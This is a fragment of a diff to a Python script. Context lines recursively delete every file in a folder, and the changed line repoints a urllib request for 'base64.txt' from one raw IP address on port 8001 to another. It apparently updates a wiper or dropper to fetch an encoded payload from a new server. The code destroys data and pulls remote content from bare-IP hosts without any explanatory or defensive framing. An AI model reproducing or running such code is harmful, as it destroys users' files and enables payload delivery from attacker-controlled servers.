@@ -13,7 +13,7 @@ for root,dirs,files in os.walk(folder):
     for name in files:
         os.remove(os.path.join(root,name))
         print(os.path.join(root,name))
-req=urllib.request.Request('http://107.173.42.32:8001/base64.txt')
+req=urllib.request.Request('http://192.3.67.204:8001/base64.txt')
 f=urllib.request.urlopen(req)
 
 #print(f.read())
